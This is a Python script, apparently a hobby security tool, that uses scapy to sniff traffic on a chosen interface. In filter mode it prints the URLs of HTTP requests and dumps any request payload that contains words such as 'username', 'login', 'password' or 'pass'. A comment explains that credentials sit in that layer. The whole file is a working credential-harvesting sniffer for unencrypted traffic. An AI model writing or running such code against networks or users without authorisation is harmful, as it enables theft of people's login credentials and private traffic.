import scapy.all as scapy
import  termcolor,argparse,sys
from scapy.layers import http
class PacSniffer:
    @staticmethod
    def get_argument():
        parser = argparse.ArgumentParser()
        parser.add_argument("-i" ,"--interface", dest="interface", help="Interface of computer")
        parser.add_argument("-f" ,"--filter", dest="filter", help="Filter packet and use value 1",default=0)
        parser.add_argument("-m", "--monitor", dest="monitor", help="For monitor use value 1 ",default=0)

        # tell this child to parse argument
        options= parser.parse_args()
        if not options.interface or  options.monitor =="0" or options.filter=="0":
            parser.error("Usages --monitor  1 --interface eth0 or wlan0 --filter 1 --interface eth0 or wlan0\nUsages -- \n use --help for more info.")
        return options

    @staticmethod
    def sniff(interface,func):
        scapy.sniff(iface=interface,store=False,prn=func)
    @staticmethod
    def data_sniffed(packet):
        if packet.haslayer(http.HTTPRequest): #if packet has http layer print the packets
            #filtering user data reques link
            # print(packet.show())
            url=packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
            termcolor.cprint(url,"red")

            if packet.haslayer(scapy.Raw):
                #print(packet[scapy.Raw])#bcz in http request password in username in Raw layer
                load =packet[scapy.Raw].load
                keywords=[b"username",b"user",b"login",b"password",b"pass",b"name",b"id"]
                for keyword in keywords:
                    if keyword in load:
                        print(load)
                        break
    @staticmethod
    def process_https(packet):
        print(packet.show())
options=PacSniffer.get_argument()
if options.monitor=="1":
    try:
        try:
            PacSniffer.sniff(options.interface,PacSniffer.process_https)
        except:
            termcolor.cprint("[-] Check spelling of given interface or check your internet connection","red")
            sys.exit()
    except KeyboardInterrupt:
        termcolor.cprint("[-] Detected ctrl c ---quiting program")
        sys.exit()
elif options.filter=="1":
    try:
        try:
            PacSniffer.sniff(options.interface,PacSniffer.data_sniffed)
        except:
            termcolor.cprint("[-] Check spelling of given interface or check your internet connection.","red")
            sys.exit()
    except KeyboardInterrupt:
        termcolor.cprint("[-] Detected ctrl c ---quiting program")
        sys.exit()
